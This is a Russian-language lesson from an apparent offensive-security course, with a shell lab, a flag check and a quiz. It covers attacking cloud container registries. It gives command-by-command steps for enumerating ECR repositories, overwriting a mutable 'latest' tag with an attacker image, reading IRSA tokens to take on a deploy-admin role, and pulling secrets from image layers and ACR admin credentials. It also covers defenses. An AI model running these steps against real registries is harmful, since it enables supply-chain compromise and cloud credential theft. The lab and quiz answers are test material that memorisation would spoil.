---
id: cloud-artifact-registry
title: "Artifact registries: ECR, GCR, ACR и отравление образов"
category: cloud
parent: cloud-supply-chain
difficulty: hard
order: 1
tags: [cloud, ecr, gcr, acr, registry, images, supply-chain, poisoning]
prerequisites: [cloud-supply-chain, cloud-containers-docker]
useful_for:
  - "Атака на container registry"
  - "Отравление образов и supply chain"
  - "Пентест CI/CD и k8s"
estimated_minutes: 45
summary: "Как атаковать облачные container registries: открытые ECR/GCR/ACR, слабая аутентификация, отравление образов, теги mutable и pull-секреты. Пути к компрометации деплоя."
lab:
  kind: shell
  title: "Практика: реестры образов (ECR/GCR/ACR) и отравление"
  toolset: [core]
  workdir: /home/student/registry
  files: [task.md, notes.md, ecr-images.txt, image-config.json]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "`ecr-images.txt` — образы в реестре; `image-config.json` — конфиг одного."
    - "Право push позволяет отравить образ, который подтянет кластер."
    - "Найди флаг: `grep nto image-config.json > found.txt`."

---

<!-- lab -->

## Задача

В прошлом уроке (`cloud-supply-chain`) мы подкладывали пакет в реестр зависимостей. Но код в облако попадает не только как npm/pip-пакет, а ещё как **контейнерный образ** — собранный «слепок» приложения, который хранится в **registry** (реестре образов): ECR у AWS, GCR/Artifact Registry у GCP, ACR у Azure.

Задача: найти образ, которым можно злоупотребить, и превратить доступ к registry в выполнение кода в чужом кластере или на чужом CI. Разберём на конкретном AWS-аккаунте.

## Данные: аккаунт и его registry

У нас есть низкопривилегированные креды AWS. Смотрим, какие репозитории образов вообще есть:

```
$ aws ecr describe-repositories --query 'repositories[].repositoryName'
[
  "acme/webapp",
  "acme/worker",
  "acme/deploy-tools"
]
```

`describe-repositories` — вызов API ECR (Elastic Container Registry), который перечисляет репозитории. Три репозитория. Нас интересует политика доступа каждого:

```
$ aws ecr get-repository-policy --repository-name acme/deploy-tools
{
  "policyText": "{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"ecr:GetDownloadUrlForLayer\",\"ecr:BatchGetImage\",\"ecr:PutImage\"],\"Condition\":{\"StringEquals\":{\"aws:PrincipalOrgID\":\"o-acme\"}}}]}"
}
```

Политика разрешает `ecr:PutImage` (загрузку образа) всем принципалам организации. Это значит: любой, кто попал в организацию, может **залить свой образ** в доверенный репозиторий.

## Пробуем в лоб: можно ли просто прочитать образ?

Прежде чем атаковать, проверим, не отдаётся ли репозиторий анонимно. Публичный ECR встречается реже, чем открытый S3, но бывает:

```
$ aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
Login Succeeded
```

Логин прошёл с нашими кредами — значит, мы уже внутри registry. Теперь смотрим образ, который использует деплой:

```
$ docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
latest: Pulling from acme/deploy-tools
Digest: sha256:9f2c...
Status: Downloaded newer image for .../acme/deploy-tools:latest
```

## Приём: mutable-тег и отравление образа

**Тег** (`latest`, `v1.2`) — это человекочитаемая метка. Проблема в том, что тег **mutable** (изменяемый): под тем же `latest` может лежать уже другой образ. Деплой по тегу `latest` — это деплой «чего угодно, что сейчас под тегом».

Если у нас есть `PutImage`, мы можем перезаписать `latest` своим образом:

```
$ docker tag attacker-payload:evil 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
$ docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/deploy-tools:latest
The push refers to repository [.../acme/deploy-tools]
latest: digest: sha256:deadbeef... size: 1234
```

Дальше чужой пайплайн делает `docker pull .../acme/deploy-tools:latest` и запускает наш код — с теми правами и секретами, что есть у деплоя.

## Полный прогон: от Pull до облачных кредов

1. **Разведка.** `describe-repositories` → список репозиториев; `get-repository-policy` → видим `PutImage` для широкого круга.
2. **Логин.** `get-login-password | docker login` проходит с нашими кредами.
3. **Смотрим образ.** `docker pull .../acme/deploy-tools:latest`, `docker inspect` → видим, что запускается, какие env ждёт.
4. **Отравление.** Собираем образ с нашим entrypoint, тегируем тем же `latest`, `docker push`.
5. **Срабатывание.** CI/деплой тянет `latest`, исполняет наш код.
6. **Секреты.** Наш процесс читает окружение и файлы, где у деплоя лежат креды:

```
$ docker run --rm .../acme/deploy-tools:latest env | grep -i aws
AWS_ROLE_ARN=arn:aws:iam::123456789012:role/deploy-admin
AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

Это **IRSA** — механизм, при котором под получает AWS-роль через токен. С таким токеном роль `deploy-admin` становится нашей.

## Публичные реестры и утечки в образах

Реестр может утекать и без записи. Ищите:

- **Публичные репозитории.** У GCP: `gcloud artifacts repositories list`, проверка `--allow-vuln-scanning` и прав `allUsers`. У ACR: `az acr repository list`.
- **Секреты внутри образов.** Кто-то собрал образ с `.env` или ключом в слое:

```
$ docker save .../acme/worker:latest -o worker.tar
$ tar xf worker.tar && grep -rE 'AKIA[0-9A-Z]{16}' .
manifest.json:... "AKIAIOSFODNN7EXAMPLE"
```

- **История слоёв.** Секрет, удалённый в следующем слое, всё равно остаётся в предыдущем: `docker history --no-trunc`.

## Другие registry: GCR и ACR

Тот же принцип работает у GCP и Azure, отличаются команды.

**GCP Artifact Registry / GCR.** Список репозиториев и проверка публичного доступа:

```
$ gcloud artifacts repositories list --format='table(name,format)'
NAME               FORMAT
acme-images        DOCKER
$ gcloud artifacts repositories get-iam-policy acme-images --format=json
{ "bindings": [ { "role": "roles/artifactregistry.writer", "members": ["allAuthenticatedUsers"] } ] }
```

`allAuthenticatedUsers` в роли `writer` — это разрешение на push любому, кто прошёл аутентификацию в Google. Тот же mutable-тег даёт подмену.

**Azure ACR.** Проверяем, не отдаётся ли реестр анонимно:

```
$ az acr show --name acmeacr --query "{adminUserEnabled:adminUserEnabled,publicNetworkAccess:publicNetworkAccess}"
{ "adminUserEnabled": true, "publicNetworkAccess": "Enabled" }
```

`adminUserEnabled: true` — включён единый admin-аккаунт с паролем; `az acr credential show` выдаёт его, и запись в реестр открыта.

## Защита и что ломает атаку

- **Immutable-теги** — включить неизменяемость: перезапись `latest` отвергается.
- **Deploy по digest.** `.../deploy-tools@sha256:9f2c...` вместо тега — образ неизменяем.
- **Подписи образов** (cosign/Notation) — деплой принимает только подписанные образы (см. `cloud-supply-chain-sbom`).
- **Строгие политики ECR/ACR** — `PutImage` только узкому кругу ролей, не всей организации.
- **Сканирование** — ECR image scanning, Trivy, Grype находят секреты и уязвимости в слоях.

## Если не сработало

- **Immutable-теги** — push под тем же тегом отвергнут.
- **Deploy по digest** — подмена тега ни на что не влияет.
- **Нет `PutImage`** — только чтение; остаётся искать секреты внутри образов.
- **Верификация подписи** — неподписанный образ не пройдёт admission.

## Мини-сценарий: подмена образа целиком

1. **Разведка.** `aws ecr describe-repositories` → `acme/deploy-tools`; `get-repository-policy` → `PutImage` для всей организации.
2. **Логин.** `aws ecr get-login-password | docker login --username AWS --password-stdin ...` → `Login Succeeded`.
3. **Изучение.** `docker pull .../acme/deploy-tools:latest`, `docker inspect` → видим entrypoint и ожидаемые env.
4. **Отравление.** Собираем образ с нашим кодом, тегируем тем же `latest`, `docker push`.
5. **Срабатывание.** Пайплайн деплоя тянет `latest` и запускает наш код.
6. **Секреты.** Наш процесс читает `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` (IRSA) → роль `deploy-admin`.
7. **Проверка.** `aws sts get-caller-identity` с токеном роли.

Право `PutImage` плюс mutable-тег — и доверенный деплой исполняет наш код.

## Что мы теперь знаем

1. Registry — это ещё один «доверенный источник кода» в облаке.
2. Mutable-тег позволяет перезаписать образ и подсунуть свой код деплою.
3. `PutImage` для широкого круга = отравление доверенного репозитория.
4. Образы часто содержат секреты в слоях и env.
5. Защита — immutable-теги, digest, подписи, сканирование.

## Частые ошибки

- **Mutable-теги + деплой по тегу** — подмена образа проходит.
- **`PutImage` для широкого круга** — любой в организации может залить образ.
- **Нет подписей и сканирования** — отравленный образ неотличим.
- **Публичные репозитории** — образы доступны всем.
- **Секреты в слоях образа** — остаются в истории навсегда.

## На что смотреть дальше

- Политики репозиториев: кому разрешён `PutImage`.
- Использует ли деплой тег (`latest`) или digest.
- `docker history --no-trunc` и env образа на предмет секретов.
- Настройки публичного доступа GCR/ACR/ECR.
- Включены ли image scanning и подписи.

## Квиз

Проверь себя.

```quiz
- question: "Почему mutable-тег (latest) опасен для деплоя?"
  options:
    - "Под тем же тегом можно залить другой образ, и деплой возьмёт его"
    - "Тег шифрует образ"
    - "Тег замедляет pull"
    - "Тег отключает TLS"
  answer: 0
  explanation: "Тег — изменяемая метка; перезапись подменяет образ."
- question: "Какое право ECR позволяет подложить свой образ?"
  options:
    - "ecr:PutImage"
    - "ecr:DescribeRepositories"
    - "ecr:GetAuthorizationToken"
    - "ecr:ListImages"
  answer: 0
  explanation: "PutImage — это загрузка образа в репозиторий."
- question: "Что надёжно фиксирует конкретный образ при деплое?"
  options:
    - "Ссылка по digest sha256"
    - "Тег latest"
    - "Имя репозитория"
    - "Регион"
  answer: 0
  explanation: "Digest неизменяем, в отличие от тега."
- question: "Почему секрет, удалённый в следующем слое образа, всё ещё опасен?"
  options:
    - "Он остаётся в предыдущем слое образа"
    - "Он автоматически шифруется"
    - "Он удаляется из реестра"
    - "Он исчезает после push"
  answer: 0
  explanation: "Слои неизменяемы; секрет виден в истории."
- question: "Что проверяет cosign при деплое образа?"
  options:
    - "Криптографическую подпись образа"
    - "Скорость pull"
    - "Размер образа"
    - "Версию Docker"
  answer: 0
  explanation: "cosign verify проверяет подпись, отсекая подмену."
```

## Куда дальше

В следующем уроке (`cloud-terraform`) мы посмотрим на ещё один источник доверия — инфраструктуру как код. Там секреты живут не в образе, а в **state**-файле Terraform, и это часто самый быстрый путь к облачным ключам. А пока главное: реестр образов — это доверенный деплой-канал, и право записи в него равно праву выполнять код в чужом кластере.

## Где пригодится

- **Bug bounty:** публичные registry и слабые политики push.
- **Red team:** отравление образа как путь к деплою.
- **Пентест:** аудит ECR/GCR/ACR и образов.
- **Работа/DevSecOps:** immutable-теги, digest-деплой, подписи, сканирование.
- **Дальше по дереву:** `cloud-supply-chain-sbom`, `cloud-terraform`, `cloud-k8s-image-supply-chain`.
